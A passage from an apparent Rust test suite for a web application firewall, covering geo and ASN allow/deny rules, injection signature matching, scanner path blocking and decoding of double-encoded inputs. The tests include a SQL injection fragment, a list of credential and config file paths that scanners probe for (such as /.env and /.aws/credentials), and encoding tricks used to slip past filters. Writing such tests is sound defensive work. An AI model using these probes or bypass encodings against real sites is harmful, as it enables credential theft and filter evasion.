            asn,
            headers,
        }
    }

    #[test]
    fn deny_wins_over_allow_and_blocks() {
        let h = HeaderMap::new();
        let mut c = cfg();
        c.country_allow = vec!["CN".into()];
        c.country_deny = vec!["KP".into()];
        c.asn_deny = vec![4134];
        assert_eq!(
            evaluate(&c, &req(&h, Some("KP"), None, "/", ""))
                .unwrap()
                .category,
            "geo_deny"
        );
        assert_eq!(
            evaluate(&c, &req(&h, Some("CN"), Some(4134), "/", ""))
                .unwrap()
                .category,
            "asn_deny"
        );
        assert!(evaluate(&c, &req(&h, Some("cn"), Some(4808), "/", "")).is_none());
    }

    #[test]
    fn allow_gate_is_case_insensitive_and_independent_of_ip_allow() {
        let h = HeaderMap::new();
        let mut c = cfg();
        c.country_allow = vec!["CN".into()];
        // A Geo allow match does not bypass the managed rules.
        let sqli = evaluate(&c, &req(&h, Some("CN"), None, "/search", "q=union select")).unwrap();
        assert_eq!(sqli.category, "sqli");
        // A miss on every allow entry is blocked by the gate itself.
        let miss = evaluate(&c, &req(&h, Some("JP"), None, "/", "")).unwrap();
        assert_eq!(miss.category, "geo_allow");
    }

    #[test]
    fn asn_allow_matches_by_autonomous_system() {
        let h = HeaderMap::new();
        let mut c = cfg();
        c.asn_allow = vec![13335];
        assert!(evaluate(&c, &req(&h, None, Some(13335), "/", "")).is_none());
        assert_eq!(
            evaluate(&c, &req(&h, None, Some(16509), "/", ""))
                .unwrap()
                .category,
            "geo_allow"
        );
    }

    #[test]
    fn missing_database_fails_open_for_deny_and_closed_for_allow() {
        let h = HeaderMap::new();
        let mut deny_only = cfg();
        deny_only.country_deny = vec!["RU".into()];
        assert!(evaluate(&deny_only, &req(&h, None, None, "/", "")).is_none());

        let mut allow = cfg();
        allow.country_allow = vec!["CN".into()];
        assert_eq!(
            evaluate(&allow, &req(&h, None, None, "/", ""))
                .unwrap()
                .category,
            "geo_allow"
        );
    }

    #[test]
    fn needs_geo_tracks_configuration() {
        let mut c = cfg();
        assert!(!c.needs_geo());
        c.asn_deny.push(64512);
        assert!(c.needs_geo());
        assert!(!c.has_geo_allow());
        c.country_allow.push("CN".into());
        assert!(c.has_geo_allow());
    }
    /// The joined matcher must only hold signatures that need a boundary scan.
    /// It used to carry the whole managed list, so every request walked ~150
    /// signatures that can never match across a separator.
    #[test]
    fn joined_groups_hold_only_boundary_signatures() {
        let m = managed_matchers();
        let mut total = 0usize;
        for (_, signatures) in m
            .full_joined_groups
            .iter()
            .chain(m.url_joined_groups.iter())
        {
            total += signatures.len();
            for signature in signatures.iter() {
                assert!(
                    needs_boundary_scan(signature, true),
                    "signature {signature:?} cannot match across a boundary but sits in the joined set"
                );
            }
        }
        assert!(total > 0, "joined set should not be empty");
        // Sanity bound: the boundary set is a small fraction of all signatures.
        assert!(total < 100, "joined set unexpectedly large: {total}");
    }

    /// Behaviour must be unchanged: a payload that spans a separator is still
    /// detected through the joined matcher.
    #[test]
    fn joined_matcher_still_detects_cross_boundary_payloads() {
        let c = cfg();
        let h = HeaderMap::new();
        // A payload whose signature spans the path/query separator still has to
        // be caught by the joined matcher.
        let hit = evaluate(&c, &req(&h, None, None, "/search", "q=1 union select 1"));
        assert_eq!(hit.map(|v| v.category), Some("sqli".to_string()));
        // A clean request must stay clean.
        assert!(evaluate(&c, &req(&h, None, None, "/products", "page=2")).is_none());
    }
    /// A sensitive path must be blocked on its own merits, with a browser
    /// User-Agent.
    ///
    /// `detects_scanners_by_ua_and_path` uses the shared `req()` helper, whose
    /// User-Agent is hard-coded to `curl` — a scanner signature. The path
    /// assertions in it therefore pass through the UA branch and never exercise
    /// the path matcher, which hid the fact that a path-only match was
    /// unreachable: `managed_hits` returned early when no injection signature
    /// matched, before the scanner check ran.
    #[test]
    fn blocks_sensitive_paths_with_a_browser_user_agent() {
        let c = cfg();
        let h = HeaderMap::new();
        let browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
                       (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
        for path in [
            "/.git/config",
            "/.env",
            "/.svn/entries",
            "/.aws/credentials",
            "/wp-login.php",
            "/phpmyadmin/index.php",
            "/.ssh/id_rsa",
            "/server-status",
        ] {
            // `req()` hard-codes the User-Agent, so build the request directly.
            let request = WafRequest {
                method: "GET",
                path,
                query: "",
                user_agent: browser,
                referer: "",
                ip: Some("198.51.100.10".parse().unwrap()),
                country: None,
                asn: None,
                headers: &h,
            };
            let verdict = evaluate(&c, &request);
            assert_eq!(
                verdict.as_ref().map(|v| v.category.as_str()),
                Some("scanners"),
                "{path} must be blocked by the path rule alone"
            );
        }
        // An ordinary path with the same User-Agent stays open.
        let clean = WafRequest {
            method: "GET",
            path: "/index.html",
            query: "",
            user_agent: browser,
            referer: "",
            ip: Some("198.51.100.10".parse().unwrap()),
            country: None,
            asn: None,
            headers: &h,
        };
        assert!(evaluate(&c, &clean).is_none());
    }

    /// The same path rules must hold on the finalised path.
    ///
    /// `finalize` switches `managed_verdict` from the legacy scan to the
    /// Aho-Corasick matchers, and that fast path returned early whenever no
    /// injection signature matched. A sensitive path like `/.git/config` matches
    /// no signature, so `hits` was zero and the request was allowed: every
    /// path-only scanner rule was dead in production while the legacy path still
    /// caught them, which is why the unit tests (all unfinalised) passed.
    #[test]
    fn blocks_sensitive_paths_on_the_finalised_path() {
        let mut c = cfg();
        c.finalize();
        assert!(
            c.compiled.managed.is_some(),
            "finalize must install the managed matchers"
        );
        let h = HeaderMap::new();
        let browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
                       (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
        for path in [
            "/.git/config",
            "/.env",
            "/.svn/entries",
            "/.aws/credentials",
            "/.ssh/id_rsa",
            "/wp-login.php",
            "/phpmyadmin/index.php",
            "/server-status",
            "/docker-compose.yml",
        ] {
            let request = WafRequest {
                method: "GET",
                path,
                query: "",
                user_agent: browser,
                referer: "",
                ip: Some("198.51.100.10".parse().unwrap()),
                country: None,
                asn: None,
                headers: &h,
            };
            assert_eq!(
                evaluate(&c, &request).map(|v| v.category),
                Some("scanners".to_string()),
                "{path} must be blocked on the finalised path"
            );
        }
        // An ordinary path stays open, so the fix did not widen the rule.
        let clean = WafRequest {
            method: "GET",
            path: "/index.html",
            query: "",
            user_agent: browser,
            referer: "",
            ip: Some("198.51.100.10".parse().unwrap()),
            country: None,
            asn: None,
            headers: &h,
        };
        assert!(evaluate(&c, &clean).is_none());
    }

    /// Disabling the scanners ruleset must still disable the path rules.
    #[test]
    fn scanner_path_rules_respect_the_toggle() {
        let mut c = cfg();
        c.managed.scanners = false;
        c.finalize();
        let h = HeaderMap::new();
        let request = WafRequest {
            method: "GET",
            path: "/.git/config",
            query: "",
            user_agent: "Mozilla/5.0 Chrome/131.0.0.0",
            referer: "",
            ip: Some("198.51.100.10".parse().unwrap()),
            country: None,
            asn: None,
            headers: &h,
        };
        assert!(evaluate(&c, &request).is_none());
    }
    /// A custom DSL rule must see the same decoded path the managed rules do.
    ///
    /// `RuleFields` takes `path`/`query` from `decode_lower_twice`, so a rule
    /// written as `path prefix "/admin"` should catch a request for `/ad%6din`.
    #[test]
    fn dsl_rules_see_percent_decoded_fields() {
        let mut c = cfg();
        c.rules = vec![WafRule {
            name: "block admin".into(),
            field: WafField::Path,
            op: WafOp::Prefix,
            value: "/admin".into(),
            action: WafAction::Block,
            priority: 0,
            enabled: true,
            expr: None,
        }];
        c.finalize();
        let h = HeaderMap::new();
        for (path, expect_blocked) in [
            ("/admin/x", true),
            ("/ad%6din/x", true),
            ("/%61dmin/x", true),
            ("/ADMIN/x", true),
            ("/public/x", false),
        ] {
            let request = WafRequest {
                method: "GET",
                path,
                query: "",
                user_agent: "Mozilla/5.0 Chrome/131.0.0.0",
                referer: "",
                ip: Some("198.51.100.10".parse().unwrap()),
                country: None,
                asn: None,
                headers: &h,
            };
            let blocked = evaluate(&c, &request).is_some();
            assert_eq!(
                blocked, expect_blocked,
                "{path} blocked={blocked}, expected {expect_blocked}"
            );
        }
    }

    /// A header value must be decoded to the same depth as the other fields.
    ///
    /// `RuleFields` decodes `path`/`query`/`ua`/`referer` with
    /// `decode_lower_twice` but header values with `decode_lower` (a single pass),
    /// so a double-encoded payload such as `%252Fadmin` reaches a header rule as
    /// `%2fadmin` instead of `/admin`.
    #[test]
    fn header_fields_decode_to_the_same_depth_as_path() {
        // Managed rules would catch the double-encoded payload on their own and
        // hide the difference, so every one of them is off for this probe.
        let mut c = cfg();
        c.managed = ManagedRules {
            sqli: false,
            xss: false,
            traversal: false,
            scanners: false,
            rce: false,
            ssrf: false,
            xxe: false,
            log4shell: false,
            crlf: false,
            ssti: false,
            nosql: false,
            ldap: false,
            java: false,
            webshell: false,
            protocol: false,
        };
        c.rules = vec![WafRule {
            name: "probe".into(),
            field: WafField::Header("x-probe".into()),
            op: WafOp::Contains,
            value: "/admin".into(),
            action: WafAction::Block,
            priority: 0,
            enabled: true,
            expr: None,
        }];
        c.finalize();
        let mut h = HeaderMap::new();
        // `%252F` decodes to `%2F` after one pass and to `/` after two. A rule
        // written as `contains "/admin"` only matches the second, so a value
        // decoded once is a bypass.
        h.insert(
            http::header::HeaderName::from_static("x-probe"),
            http::header::HeaderValue::from_static("/%252Fadmin"),
        );
        let request = WafRequest {
            method: "GET",
            path: "/safe",
            query: "",
            user_agent: "Mozilla/5.0",
            referer: "",
            ip: Some("198.51.100.10".parse().unwrap()),
            country: None,
            asn: None,
            headers: &h,
        };
        assert_eq!(
            evaluate(&c, &request).map(|v| v.rule_name),
            Some("probe".to_string()),
            "a double-encoded header value must be caught, not just a single-encoded one"
        );
    }
}
